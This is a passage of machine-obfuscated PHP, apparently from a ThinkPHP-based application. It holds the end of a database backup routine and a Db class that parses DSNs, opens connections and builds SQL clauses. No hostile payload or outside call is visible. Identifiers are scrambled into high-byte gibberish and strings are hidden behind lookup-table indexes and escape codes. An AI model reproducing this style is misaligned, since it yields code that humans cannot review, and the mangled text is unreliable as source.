$ÁŠÔ™¦[826])); foreach ($Ø¼ÄØˆ as $Í¼š¬Ş) { $ìØÕ« ’ += $•‹È½º‹->model($Í¼š¬Ş)->count(); } $Êş¦ÅÌù->task[$ÁŠÔ™¦[827]] = $ìØÕ« ’; $GLOBALS[$ÁŠÔ™¦[828]] = self::$name; foreach ($Ø¼ÄØˆ as $Í¼š¬Ş) { $½çœÖ‘Å = $õşĞ€ˆ . $Í¼š¬Ş . $ÁŠÔ™¦[829]; $üƒ ™„ = null; if ($Í¼š¬Ş == $ÁŠÔ™¦[830] && (!isset($£ÏõúÌÓ[$ÁŠÔ™¦[795]]) || $£ÏõúÌÓ[$ÁŠÔ™¦[795]] == $ÁŠÔ™¦[224])) { $üƒ ™„ = self::$io; } $ºŠä¸¯á += $•‹È½º‹->sqlFromDb($Í¼š¬Ş, $½çœÖ‘Å, $Êş¦ÅÌù, $üƒ ™„); } unset($GLOBALS[$ÁŠÔ™¦[828]]); $Êş¦ÅÌù->end(); if ($ºŠä¸¯á > $ìØÕ« ’) { $ìØÕ« ’ = $ºŠä¸¯á; } $íÄì¯¬“ = array($ÁŠÔ™¦[817] => $Ê¨òúï, $ÁŠÔ™¦[814] => 1, $ÁŠÔ™¦[831] => $ìØÕ« ’, $ÁŠÔ™¦[832] => $ºŠä¸¯á, $ÁŠÔ™¦[833] => time()); Backup::set($íÄì¯¬“); if ($ìØÕ« ’ - $ºŠä¸¯á > 0) { $¿ş‘ÒÖÈ = $ÁŠÔ™¦[834]; if (stristr(I18n::getType(), $ÁŠÔ™¦[835])) { $¿ş‘ÒÖÈ = $ÁŠÔ™¦[836]; } write_log(array($¿ş‘ÒÖÈ, $íÄì¯¬“), $ÁŠÔ™¦[821]); return !1; } return !0; } private function tmpFilesPath() { $é´’ùã— =& $_SERVER[•€áå–Õ]; $‚µŞç³Ø = TEMP_FILES; if ($GLOBALS[$é´’ùã—[16]][$é´’ùã—[101]][$é´’ùã—[837]]) { $‚µŞç³Ø = $GLOBALS[$é´’ùã—[16]][$é´’ùã—[101]][$é´’ùã—[837]]; if (!mk_dir($‚µŞç³Ø) || !is_writable($‚µŞç³Ø) || !IO::mkfile($‚µŞç³Ø . $é´’ùã—[838])) { $‚µŞç³Ø = TEMP_FILES; } } return $‚µŞç³Ø; } } goto EÕ¨„³ÜÑñ; d×äğ³³Úö: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\x65\x71" => "\74\x3e", "\x67\164" => "\x3e", "\x65\147\164" => "\76\75", "\x6c\164" => "\74", "\145\154\164" => "\x3c\x3d", "\x6e\x6f\x74\x6c\x69\x6b\145" => "\116\117\124\40\x4c\111\113\x45", "\154\151\x6b\x65" => "\114\111\x4b\x45", "\x69\x6e" => "\x49\x4e", "\156\x6f\x74\x69\x6e" => "\116\x4f\x54\40\111\x4e", "\156\157\164\x20\151\156" => "\116\117\x54\x20\111\x4e", "\142\145\x74\x77\145\145\156" => "\102\105\124\127\105\x45\x4e", "\156\x6f\164\142\145\x74\x77\x65\145\x6e" => "\x4e\x4f\x54\x20\102\x45\124\x57\x45\105\x4e", "\156\x6f\164\40\x62\145\x74\167\x65\x65\156" => "\116\117\x54\40\x42\x45\x54\127\105\x45\116"); protected $selectSql = "\123\105\114\x45\x43\x54\45\x44\x49\x53\x54\x49\x4e\103\x54\45\x20\x25\x46\111\x45\x4c\104\45\40\106\x52\x4f\115\40\x25\124\101\x42\114\105\45\45\x4a\x4f\111\x4e\x25\45\x57\x48\105\122\105\x25\x25\x47\122\x4f\x55\x50\x25\45\x48\x41\x56\111\116\107\x25\45\x4f\x52\x44\105\x52\x25\45\114\111\x4d\x49\124\x25\40\45\x55\116\111\117\x4e\45\45\103\117\x4d\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $í‰°ĞÒ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[•€áå–Õ][1001], $í‰°ĞÒ); } public function factory($ï«ë¯³ì = '') { $¢ØÎŸÙë =& $_SERVER[•€áå–Õ]; $ï«ë¯³ì = $this->parseConfig($ï«ë¯³ì); if (empty($ï«ë¯³ì[$¢ØÎŸÙë[1002]])) { think_exception(think_lang($¢ØÎŸÙë[1003])); } $this->dbType = ucwords(strtolower($ï«ë¯³ì[$¢ØÎŸÙë[1002]])); $ ë¥ú‚¼ = $¢ØÎŸÙë[1004] . $this->dbType; if (class_exists($ ë¥ú‚¼)) { $úÖ™”¼É = new $ ë¥ú‚¼($ï«ë¯³ì); if ($¢ØÎŸÙë[1005] != strtolower($ï«ë¯³ì[$¢ØÎŸÙë[1002]])) { $úÖ™”¼É->dbType = strtoupper($this->dbType); } else { $úÖ™”¼É->dbType = $this->_getDsnType($ï«ë¯³ì[$¢ØÎŸÙë[957]]); } } else { think_exception(think_lang($¢ØÎŸÙë[1006]) . $¢ØÎŸÙë[1007] . $ ë¥ú‚¼); } return $úÖ™”¼É; } public function __call($¡˜öß˜Ò, $Šö€°íæ) { if (method_exists($this, $¡˜öß˜Ò)) { return call_user_func_array(array($this, $¡˜öß˜Ò), $Šö€°íæ); } } protected function _getDsnType($ö •Ó“­) { $­é›˜Ù† = explode($_SERVER[•€áå–Õ][4], $ö •Ó“­); $¬»ÔİÏ‡ = strtoupper(trim($­é›˜Ù†[0])); return $¬»ÔİÏ‡; } private function parseConfig($‘ÙØÅ = '') { $‡ì“‘„ü =& $_SERVER[•€áå–Õ]; if (!empty($‘ÙØÅ) && is_string($‘ÙØÅ)) { $‘ÙØÅ = $this->parseDSN($‘ÙØÅ); } elseif (is_array($‘ÙØÅ)) { $‘ÙØÅ = array_change_key_case($‘ÙØÅ); $‘ÙØÅ = array($‡ì“‘„ü[1002] => $‘ÙØÅ[$‡ì“‘„ü[1008]], $‡ì“‘„ü[929] => $‘ÙØÅ[$‡ì“‘„ü[1009]], $‡ì“‘„ü[930] => $‘ÙØÅ[$‡ì“‘„ü[1010]], $‡ì“‘„ü[927] => $‘ÙØÅ[$‡ì“‘„ü[1011]], $‡ì“‘„ü[928] => $‘ÙØÅ[$‡ì“‘„ü[1012]], $‡ì“‘„ü[31] => $‘ÙØÅ[$‡ì“‘„ü[1013]], $‡ì“‘„ü[957] => $‘ÙØÅ[$‡ì“‘„ü[1014]], $‡ì“‘„ü[27] => isset($‘ÙØÅ[$‡ì“‘„ü[1015]]) ? $‘ÙØÅ[$‡ì“‘„ü[1015]] : array()); } elseif (empty($‘ÙØÅ)) { if (think_config($‡ì“‘„ü[1016]) && $‡ì“‘„ü[1005] != strtolower(think_config($‡ì“‘„ü[1017]))) { $‘ÙØÅ = $this->parseDSN(think_config($‡ì“‘„ü[1016])); } else { $‘ÙØÅ = array($‡ì“‘„ü[1002] => think_config($‡ì“‘„ü[1017]), $‡ì“‘„ü[929] => think_config($‡ì“‘„ü[1018]), $‡ì“‘„ü[930] => think_config($‡ì“‘„ü[1019]), $‡ì“‘„ü[927] => think_config($‡ì“‘„ü[1020]), $‡ì“‘„ü[928] => think_config($‡ì“‘„ü[1021]), $‡ì“‘„ü[31] => think_config($‡ì“‘„ü[301]), $‡ì“‘„ü[957] => think_config($‡ì“‘„ü[1016]), $‡ì“‘„ü[27] => think_config($‡ì“‘„ü[1022])); } } return $‘ÙØÅ; } protected function initConnect($óè‚ÎÊŞ = true) { if (1 == think_config($_SERVER[•€áå–Õ][32])) { $this->_linkID = $this->multiConnect($óè‚ÎÊŞ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $£Â¿¡‚š => $Ğæ´ÒÓè) { $this->_linkID = $Ğæ´ÒÓè; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ŸÃ—Ë·… = false) { $ÂÁÀ‰¾• =& $_SERVER[•€áå–Õ]; static $‚Ù°‹¯ = array(); static $ßòêû«¼ = -1; if (empty($‚Ù°‹¯)) { foreach ($this->config as $úæÌ¦½É => $Ùı§‡†ß) { $‚Ù°‹¯[$úæÌ¦½É] = explode($ÂÁÀ‰¾•[60], $Ùı§‡†ß); } } if (think_config($ÂÁÀ‰¾•[1023])) { if ($ŸÃ—Ë·… || think_config($ÂÁÀ‰¾•[450]) === !0) { $Í÷ü´Á³ = floor(mt_rand(0, think_config($ÂÁÀ‰¾•[1024]) - 1)); $ßòêû«¼ = $Í÷ü´Á³; } else { if (is_numeric(think_config($ÂÁÀ‰¾•[1025]))) { $Í÷ü´Á³ = think_config($ÂÁÀ‰¾•[1025]); } else { $Í÷ü´Á³ = floor(mt_rand(think_config($ÂÁÀ‰¾•[1024]), count($‚Ù°‹¯[$ÂÁÀ‰¾•[927]]) - 1)); } } } else { $Í÷ü´Á³ = floor(mt_rand(0, count($‚Ù°‹¯[$ÂÁÀ‰¾•[927]]) - 1)); $ßòêû«¼ = $Í÷ü´Á³; } $Í÷ü´Á³ = $ßòêû«¼ !== -1 ? $ßòêû«¼ : $Í÷ü´Á³; $™«üç³Ò = array($ÂÁÀ‰¾•[929] => isset($‚Ù°‹¯[$ÂÁÀ‰¾•[929]][$Í÷ü´Á³]) ? $‚Ù°‹¯[$ÂÁÀ‰¾•[929]][$Í÷ü´Á³] : $‚Ù°‹¯[$ÂÁÀ‰¾•[929]][0], $ÂÁÀ‰¾•[930] => isset($‚Ù°‹¯[$ÂÁÀ‰¾•[930]][$Í÷ü´Á³]) ? $‚Ù°‹¯[$ÂÁÀ‰¾•[930]][$Í÷ü´Á³] : $‚Ù°‹¯[$ÂÁÀ‰¾•[930]][0], $ÂÁÀ‰¾•[927] => isset($‚Ù°‹¯[$ÂÁÀ‰¾•[927]][$Í÷ü´Á³]) ? $‚Ù°‹¯[$ÂÁÀ‰¾•[927]][$Í÷ü´Á³] : $‚Ù°‹¯[$ÂÁÀ‰¾•[927]][0], $ÂÁÀ‰¾•[928] => isset($‚Ù°‹¯[$ÂÁÀ‰¾•[928]][$Í÷ü´Á³]) ? $‚Ù°‹¯[$ÂÁÀ‰¾•[928]][$Í÷ü´Á³] : $‚Ù°‹¯[$ÂÁÀ‰¾•[928]][0], $ÂÁÀ‰¾•[31] => isset($‚Ù°‹¯[$ÂÁÀ‰¾•[31]][$Í÷ü´Á³]) ? $‚Ù°‹¯[$ÂÁÀ‰¾•[31]][$Í÷ü´Á³] : $‚Ù°‹¯[$ÂÁÀ‰¾•[31]][0], $ÂÁÀ‰¾•[957] => isset($‚Ù°‹¯[$ÂÁÀ‰¾•[957]][$Í÷ü´Á³]) ? $‚Ù°‹¯[$ÂÁÀ‰¾•[957]][$Í÷ü´Á³] : $‚Ù°‹¯[$ÂÁÀ‰¾•[957]][0], $ÂÁÀ‰¾•[27] => isset($‚Ù°‹¯[$ÂÁÀ‰¾•[27]][$Í÷ü´Á³]) ? $‚Ù°‹¯[$ÂÁÀ‰¾•[27]][$Í÷ü´Á³] : $‚Ù°‹¯[$ÂÁÀ‰¾•[27]][0]); return $this->connect($™«üç³Ò, $Í÷ü´Á³); } public function parseDSN($•ş®İÚ‘) { $Ù¨¿Ô… =& $_SERVER[•€áå–Õ]; if (empty($•ş®İÚ‘)) { return !1; } $ğ»â²òº = parse_url($•ş®İÚ‘); if ($ğ»â²òº[$Ù¨¿Ô…[207]]) { $×ˆÕÉ” = array($Ù¨¿Ô…[1002] => $ğ»â²òº[$Ù¨¿Ô…[207]], $Ù¨¿Ô…[929] => isset($ğ»â²òº[$Ù¨¿Ô…[641]]) ? $ğ»â²òº[$Ù¨¿Ô…[641]] : $Ù¨¿Ô…[22], $Ù¨¿Ô…[930] => isset($ğ»â²òº[$Ù¨¿Ô…[1026]]) ? $ğ»â²òº[$Ù¨¿Ô…[1026]] : $Ù¨¿Ô…[22], $Ù¨¿Ô…[927] => isset($ğ»â²òº[$Ù¨¿Ô…[208]]) ? $ğ»â²òº[$Ù¨¿Ô…[208]] : $Ù¨¿Ô…[22], $Ù¨¿Ô…[928] => isset($ğ»â²òº[$Ù¨¿Ô…[209]]) ? $ğ»â²òº[$Ù¨¿Ô…[209]] : $Ù¨¿Ô…[22], $Ù¨¿Ô…[31] => isset($ğ»â²òº[$Ù¨¿Ô…[96]]) ? substr($ğ»â²òº[$Ù¨¿Ô…[96]], 1) : $Ù¨¿Ô…[22]); } else { preg_match($Ù¨¿Ô…[1027], trim($•ş®İÚ‘), $°Ò«§ä); $×ˆÕÉ” = array($Ù¨¿Ô…[1002] => $°Ò«§ä[1], $Ù¨¿Ô…[929] => $°Ò«§ä[2], $Ù¨¿Ô…[930] => $°Ò«§ä[3], $Ù¨¿Ô…[927] => $°Ò«§ä[4], $Ù¨¿Ô…[928] => $°Ò«§ä[5], $Ù¨¿Ô…[31] => $°Ò«§ä[6]); } $×ˆÕÉ”[$Ù¨¿Ô…[957]] = $Ù¨¿Ô…[22]; return $×ˆÕÉ”; } protected function debug() { $ú ·Ö­ =& $_SERVER[•€áå–Õ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ú ·Ö­[1028]; if (think_config($ú ·Ö­[1029])) { think_status($ú ·Ö­[1030]); think_trace($this->queryStr . $ú ·Ö­[1031] . think_status($ú ·Ö­[34], $ú ·Ö­[1030], 6) . $ú ·Ö­[1032], $ú ·Ö­[22], $ú ·Ö­[1033]); } } protected function parseLock($²‡è×ü– = false) { $£ö…¹´¥ =& $_SERVER[•€áå–Õ]; if (!$²‡è×ü–) { return $£ö…¹´¥[22]; } if ($£ö…¹´¥[959] == $this->dbType) { return $£ö…¹´¥[1034]; } return $£ö…¹´¥[1035]; } protected function parseSet($¶×Ğ¸“) { $ÏÖÁö¢ =& $_SERVER[•€áå–Õ]; foreach ($¶×Ğ¸“ as $ä»Àìß => $§ü˜¨·’) { if (is_array($§ü˜¨·’) && $ÏÖÁö¢[352] == $§ü˜¨·’[0]) { $¹ÎÉ»§æ[] = $this->parseKey($ä»Àìß) . $ÏÖÁö¢[925] . $§ü˜¨·’[1]; } elseif (is_scalar($§ü˜¨·’) || is_null($§ü˜¨·’)) { $¹ÎÉ»§æ[] = $this->parseKey($ä»Àìß) . $ÏÖÁö¢[925] . $this->parseValue($§ü˜¨·’); } } return $ÏÖÁö¢[1036] . implode($ÏÖÁö¢[60], $¹ÎÉ»§æ); } protected function bindParam($­ğƒî€, $°²”•‚¦) { $this->bind[$_SERVER[•€áå–Õ][4] . $­ğƒî€] = $°²”•‚¦; } protected function parseBind($æ½ù¿ß) { $æ½ù¿ß = array_merge($this->bind, $æ½ù¿ß); $this->bind = array(); return $æ½ù¿ß; } function parseKey(&$«õù¯·Ù, $Ö´êÓ¬ = true) { if ($Ö´êÓ¬) { $«õù¯·Ù = $this->parseKeyCheck($«õù¯·Ù); } return $«õù¯·Ù; } function parseKeyCheck($šİÅ¼) { $¤Óß‡Ï =& $_SERVER[•€áå–Õ]; $šİÅ¼ = trim($šİÅ¼); if (!preg_match($¤Óß‡Ï[1037], $šİÅ¼)) { think_exception($¤Óß‡Ï[1038] . $šİÅ¼); } return $šİÅ¼; } protected function parseValue($²ãëÖÒÌ) { $Á¨—«ú§ =& $_SERVER[•€áå–Õ]; if (is_string($²ãëÖÒÌ)) { $²ãëÖÒÌ = $Á¨—«ú§[998] . $this->escapeString($²ãëÖÒÌ) . $Á¨—«ú§[998]; } elseif (isset($²ãëÖÒÌ[0]) && is_string($²ãëÖÒÌ[0]) && strtolower($²ãëÖÒÌ[0]) == $Á¨—«ú§[352]) { $²ãëÖÒÌ = $this->escapeString($²ãëÖÒÌ[1]); } elseif (is_array($²ãëÖÒÌ)) { $²ãëÖÒÌ = array_map(array($this, $Á¨—«ú§[999]), $²ãëÖÒÌ); } elseif (is_bool($²ãëÖÒÌ)) { $²ãëÖÒÌ = $²ãëÖÒÌ ? $Á¨—«ú§[100] : $Á¨—«ú§[224]; } elseif (is_null($²ãëÖÒÌ)) { $²ãëÖÒÌ = $Á¨—«ú§[115]; } return $²ãëÖÒÌ; } protected function parseField($²€õÁò©) { $øù’ÏĞÀ =& $_SERVER[•€áå–Õ]; if (is_string($²€õÁò©) && strpos($²€õÁò©, $øù’ÏĞÀ[60])) { $²€õÁò© = explode($øù’ÏĞÀ[60], $²€õÁò©); } if (is_array($²€õÁò©)) { $ÚúÖƒÚ² = array(); foreach ($²€õÁò© as $×‰Œ–‰ => $âñòÎ·Ú) { if (!is_numeric($×‰Œ–‰)) { $ÚúÖƒÚ²[] = $this->parseKey($×‰Œ–‰, !1) . $øù’ÏĞÀ[1039] . $this->parseKey($âñòÎ·Ú); } else { $ÚúÖƒÚ²[] = $this->parseKey($âñòÎ·Ú); } } $ƒ–¢¡«İ = implode($øù’ÏĞÀ[60], $ÚúÖƒÚ²); } elseif (is_string($²€õÁò©) && !empty($²€õÁò©)) { $ƒ–¢¡«İ = $²€õÁò©; } else { $ƒ–¢¡«İ = $øù’ÏĞÀ[215]; } return $ƒ–¢¡«İ; } protected function parseTable($¬ıçÇ×ñ) { $½Ğˆ©«… =& $_SERVER[•€áå–Õ]; if (is_array($¬ıçÇ×ñ)) { $æ¾ŞÇ‹è = array(); foreach ($¬ıçÇ×ñ as $í‹‡©¹ => $Ã©ÕÂµ) { if (!is_numeric($í‹‡©¹)) { $æ¾ŞÇ‹è[] = $this->parseKey($í‹‡©¹) . $½Ğˆ©«…[63] . $this->parseKey($Ã©ÕÂµ); } else { $æ¾ŞÇ‹è[] = $this->parseKey($í‹‡©¹); } } $¬ıçÇ×ñ = $æ¾ŞÇ‹è; } elseif (is_string($¬ıçÇ×ñ)) { if (strstr($¬ıçÇ×ñ, $½Ğˆ©«…[63])) { return $¬ıçÇ×ñ; } $¬ıçÇ×ñ = explode($½Ğˆ©«…[60], $¬ıçÇ×ñ); array_walk($¬ıçÇ×ñ, array($this, $½Ğˆ©«…[947])); } return $½Ğˆ©«…[941] . trim(implode($½Ğˆ©«…[1040], $¬ıçÇ×ñ), $½Ğˆ©«…[440]) . $½Ğˆ©«…[941]; } protected function parseWhere($ºÊ‘¨·×) { $¹É˜˜¿º =& $_SERVER[•€áå–Õ]; $öµö§¡§ = $¹É˜˜¿º[22]; if (is_string($ºÊ‘¨·×)) { $öµö§¡§ = $ºÊ‘¨·×; } else { $ì¯ÈˆÂ = isset($ºÊ‘¨·×[$¹É˜˜¿º[1041]]) ? strtoupper($ºÊ‘¨·×[$¹É˜˜¿º[1041]]) : $¹É˜˜¿º[22]; if (in_array($ì¯ÈˆÂ, array($¹É˜˜¿º[1042], $¹É˜˜¿º[1043], $¹É˜˜¿º[1044]))) { $ì¯ÈˆÂ = $¹É˜˜¿º[63] . $ì¯ÈˆÂ . $¹É˜˜¿º[63]; unset($ºÊ‘¨·×[$¹É˜˜¿º[1041]]); } else { $ì¯ÈˆÂ = $¹É˜˜¿º[1045]; } foreach ($ºÊ‘¨·× as $Š¿º³Å³ => $”ú™ß¼¬) { $öµö§¡§ .= $¹É˜˜¿º[332]; if (is_numeric($Š¿º³Å³)) { $Š¿º³Å³ = $¹É˜˜¿º[1046]; } if (0 === strpos($Š¿º³Å³, $¹É˜˜¿º[21])) { $öµö§¡§ .= $this->parseThinkWhere($Š¿º³Å³, $”ú™ß¼¬); } else { if (!preg_match($¹É˜˜¿º[1047], trim($Š¿º³Å³))) { think_exception(think_lang($¹É˜˜¿º[1048]) . $¹É˜˜¿º[4] . $Š¿º³Å³); } $´æä®Ø‰ = is_array($”ú™ß¼¬) && isset($”ú™ß¼¬[$¹É˜˜¿º[1049]]); $Š¿º³Å³ = trim($Š¿º³Å³); if (strpos($Š¿º³Å³, $¹É˜˜¿º[338])) { $ùÈõÚÇí = explode($¹É˜˜¿º[338], $Š¿º³Å³); $Äâ¯Œ–ñ = array(); foreach ($ùÈõÚÇí as $¾Ş¿˜Š => $«ÕõÕÙÈ) { $£Ôíå¹„ = $´æä®Ø‰ ? $”ú™ß¼¬[$¾Ş¿˜Š] : $”ú™ß¼¬; $Äâ¯Œ–ñ[] = $¹É˜˜¿º[315] . $this->parseWhereItem($this->parseKey($«ÕõÕÙÈ), $£Ôíå¹„) . $¹É˜˜¿º[946]; } $öµö§¡§ .= implode($¹É˜˜¿º[1050], $Äâ¯Œ–ñ); } elseif (strpos($Š¿º³Å³, $¹É˜˜¿º[339])) { $ùÈõÚÇí = explode($¹É˜˜¿º[339], $Š¿º³Å³); $Äâ¯Œ–ñ = array(); foreach ($ùÈõÚÇí as $¾Ş¿˜Š => $«ÕõÕÙÈ) { $£Ôíå¹„ = $´æä®Ø‰ ? $”ú™ß¼¬[$¾Ş¿˜Š] : $”ú™ß¼¬; $Äâ¯Œ–ñ[] = $¹É˜˜¿º[315] . $this->parseWhereItem($this->parseKey($«ÕõÕÙÈ), $£Ôíå¹„) . $¹É˜˜¿º[946]; } $öµö§¡§ .= implode($¹É˜˜¿º[1045], $Äâ¯Œ–ñ); } else { $öµö§¡§ .= $this->parseWhereItem($this->parseKey($Š¿º³Å³), $”ú™ß¼¬); } } $öµö§¡§ .= $¹É˜˜¿º[333] . $ì¯ÈˆÂ; } $öµö§¡§ = substr($öµö§¡§, 0, -strlen($ì¯ÈˆÂ)); } return empty($öµö§¡§) ? $¹É˜˜¿º[22] : $¹É˜˜¿º[1051] . $öµö§¡§; } protected function parseWhereItem($Ì°Ñ¶•¥, $‹ø¡ÈÍ’) { $»åè›ë =& $_SERVER[•€áå–Õ]; $¢Í…°¨ = $»åè›ë[22]; if (is_array($‹ø¡ÈÍ’)) { if (is_string($‹ø¡ÈÍ’[0])) { $©’éŠ‹« = strtolower($‹ø¡ÈÍ’[0]); if (in_array($‹ø¡ÈÍ’[0], array($»åè›ë[925], $»åè›ë[1052], $»åè›ë[1053], $»åè›ë[1054], $»åè›ë[1055], $»åè›ë[1056]))) { $¢Í…°¨ .= $Ì°Ñ¶•¥ . $»åè›ë[63] . $‹ø¡ÈÍ’[0] . $»åè›ë[63] . $this->parseValue($‹ø¡ÈÍ’[1]); } elseif (preg_match($»åè›ë[1057], $‹ø¡ÈÍ’[0])) { $¢Í…°¨ .= $Ì°Ñ¶•¥ . $»åè›ë[63] . $this->exp[$©’éŠ‹«] . $»åè›ë[63] . $this->parseValue($‹ø¡ÈÍ’[1]); } elseif (preg_match($»åè›ë[1058], $‹ø¡ÈÍ’[0])) { if (is_array($‹ø¡ÈÍ’[1])) { $œ¹ı¿–º = isset($‹ø¡ÈÍ’[2]) ? strtoupper($‹ø¡ÈÍ’[2]) : $»åè›ë[1043]; if (in_array($œ¹ı¿–º, array($»åè›ë[1042], $»åè›ë[1043], $»åè›ë[1044]))) { $‡êé„„ß = array(); foreach ($‹ø¡ÈÍ’[1] as $­ç®¹Ü­) { $‡êé„„ß[] = $Ì°Ñ¶•¥ . $»åè›ë[63] . $this->exp[$©’éŠ‹«] . $»åè›ë[63] . $this->parseValue($­ç®¹Ü­); } $¢Í…°¨ .= $»åè›ë[315] . implode($»åè›ë[63] . $œ¹ı¿–º . $»åè›ë[63], $‡êé„„ß) . $»åè›ë[946]; } } else { $¢Í…°¨ .= $Ì°Ñ¶•¥ . $»åè›ë[63] . $this->exp[$©’éŠ‹«] . $»åè›ë[63] . $this->parseValue($‹ø¡ÈÍ’[1]); } } elseif ($»åè›ë[352] == $©’éŠ‹«) { $¢Í…°¨ .= $»åè›ë[944] . $Ì°Ñ¶•¥ . $»åè›ë[63] . $‹ø¡ÈÍ’[1] . $»åè›ë[1059]; } elseif (preg_match($»åè›ë[1060], $‹ø¡ÈÍ’[0])) { $¢Í…°¨ .= $‹ø¡ÈÍ’[0]; } elseif (preg_match($»åè›ë[1061], $‹ø¡ÈÍ’[0])) { if (isset($‹ø¡ÈÍ’[2]) && $»åè›ë[352] == $‹ø¡ÈÍ’[2]) { $¢Í…°¨ .= $Ì°Ñ¶•¥ . $»åè›ë[63] . $this->exp[$©’éŠ‹«] . $»åè›ë[63] . $‹ø¡ÈÍ’[1]; } else { if (is_string($‹ø¡ÈÍ’[1])) { $‹ø¡ÈÍ’[1] = explode($»åè›ë[60], $‹ø¡ÈÍ’[1]); } $™ŸÁ¦äœ = implode($»åè›ë[60], $this->parseValue($‹ø¡ÈÍ’[1])); $¢Í…°¨ .= $Ì°Ñ¶•¥ . $»åè›ë[63] . $this->exp[$©’éŠ‹«] . $»åè›ë[944] . $™ŸÁ¦äœ . $»åè›ë[946]; } } elseif (preg_match($»åè›ë[1062], $‹ø¡ÈÍ’[0])) { $­º İáÙ = is_string($‹ø¡ÈÍ’[1]) ? explode($»åè›ë[60], $‹ø¡ÈÍ’[1]) : $‹ø¡ÈÍ’[1]; $¢Í…°¨ .= $»åè›ë[944] . $Ì°Ñ¶•¥ . $»åè›ë[63] . $this->exp[$©’éŠ‹«] . $»åè›ë[63] . $this->parseValue($­º İáÙ[0]) . $»åè›ë[1045] . $this->parseValue($­º İáÙ[1]) . $»åè›ë[333]; } else { think_exception(think_lang($»åè›ë[1048]) . $»åè›ë[4] . $‹ø¡ÈÍ’[0]); } } else { $ŠÌ‰®åú = count($‹ø¡ÈÍ’); $¥šˆÚ™ú = $»åè›ë[22]; if (is_string($‹ø¡ÈÍ’[$ŠÌ‰®åú - 1])) { $¥šˆÚ™ú = isset($‹ø¡ÈÍ’[$ŠÌ‰®åú - 1]) ? strtoupper($‹ø¡ÈÍ’[$ŠÌ‰®åú - 1]) : $»åè›ë[22]; if (in_array($¥šˆÚ™ú, array($»åè›ë[1042], $»åè›ë[1043], $»åè›ë[1044]))) { $ŠÌ‰®åú = $ŠÌ‰®åú - 1; } } else { $¥šˆÚ™ú = $»åè›ë[1042]; } for ($ãùšáæ© = 0; $ãùšáæ© < $ŠÌ‰®åú; $ãùšáæ©++) { $­º İáÙ = is_array($‹ø¡ÈÍ’[$ãùšáæ©]) ? $‹ø¡ÈÍ’[$ãùšáæ©][1] : $‹ø¡ÈÍ’[$ãùšáæ©]; if ($»åè›ë[352] == strtolower($‹ø¡ÈÍ’[$ãùšáæ©][0])) { $¢Í…°¨ .= $»åè›ë[315] . $Ì°Ñ¶•¥ . $»åè›ë[63] . $­º İáÙ . $»åè›ë[1059] . $¥šˆÚ™ú . $»åè›ë[63]; } else { $©‡ÛÆ· = is_array($‹ø¡ÈÍ’[$ãùšáæ©]) ? $this->exp[strtolower($‹ø¡ÈÍ’[$ãùšáæ©][0])] : $»åè›ë[925]; if (!$©‡ÛÆ· && is_array($‹ø¡ÈÍ’[$ãùšáæ©]) && in_array($‹ø¡ÈÍ’[$ãùšáæ©][0], array($»åè›ë[925], $»åè›ë[1052], $»åè›ë[1053], $»åè›ë[1054], $»åè›ë[1055], $»åè›ë[1056]))) { $©‡ÛÆ· = $‹ø¡ÈÍ’[$ãùšáæ©][0]; } $¢Í…°¨ .= $»åè›ë[315] . $Ì°Ñ¶•¥ . $»åè›ë[63] . $©‡ÛÆ· . $»åè›ë[63] . $this->parseValue($­º İáÙ) . $»åè›ë[1059] . $¥šˆÚ™ú . $»åè›ë[63]; } } $¢Í…°¨ = substr($¢Í…°¨, 0, -4); } } else { $¢Í…°¨ .= $Ì°Ñ¶•¥ . $»åè›ë[1063] . $this->parseValue($‹ø¡ÈÍ’); } return $¢Í…°¨; } protected function parseThinkWhere($ºà´Í×Œ, $•œá´†ö) { $±œÆ­‰ =& $_SERVER[•€áå–Õ]; $šÇ§÷·î = $±œÆ­‰[22]; switch ($ºà´Í×Œ) { case $±œÆ­‰[407]: $šÇ§÷·î = $•œá´†ö; break; case $±œÆ­‰[1046]: $šÇ§÷·î = is_string($•œá´†ö) ? $•œá´†ö : substr($this->parseWhere($•œá´†ö), 6); break; case $±œÆ­‰[1064]: parse_str($•œá´†ö, $³ÏæŠÃÁ); if (isset($³ÏæŠÃÁ[$±œÆ­‰[1041]])) { $Êöü‡¤ = $±œÆ­‰[63] . strtoupper($³ÏæŠÃÁ[$±œÆ­‰[1041]]) . $±œÆ­‰[63]; unset($³ÏæŠÃÁ[$±œÆ­‰[1041]]); } else { $Êöü‡¤ = $±œÆ­‰[1045]; } $ëš¿ – = array(); foreach ($³ÏæŠÃÁ as $¤ÆàÖğ” => $Ûó‡Ä“ã) { $ëš¿ –[] = $this->parseKey($¤ÆàÖğ”) . $±œÆ­‰[1063] . $this->parseValue($Ûó‡Ä“ã); } $šÇ§÷·î = implode($Êöü‡¤, $ëš¿ –); break; } return $šÇ§÷·î; } protected function parseLimit($ˆ¨µî«¥) { $÷Ü¬ÁÀ¹ =& $_SERVER[•€áå–Õ]; return !empty($ˆ¨µî«¥) ? $÷Ü¬ÁÀ¹[61] . $ˆ¨µî«¥ . $÷Ü¬ÁÀ¹[63] : $÷Ü¬ÁÀ¹[22]; } protected function parseJoin($’îéÔéè) { $»¢òîÔË =& $_SERVER[•€áå–Õ]; $ÆÙìø±– = $»¢òîÔË[22]; if (!empty($’îéÔéè)) { if (is_array($’îéÔéè)) { foreach ($’îéÔéè as $íí€º­… => $†ëæ¿ùà) { if (!1 !== stripos($†ëæ¿ùà, $»¢òîÔË[1065])) { $ÆÙìø±– .= $»¢òîÔË[63] . $†ëæ¿ùà; } else { $ÆÙìø±– .= $»¢òîÔË[1066] . $†ëæ¿ùà; } } } else { $ÆÙìø±– .= $»¢òîÔË[1066] . $’îéÔéè; } } $ÆÙìø±– = preg_replace($»¢òîÔË[1067], think_config($»¢òîÔË[971]) . 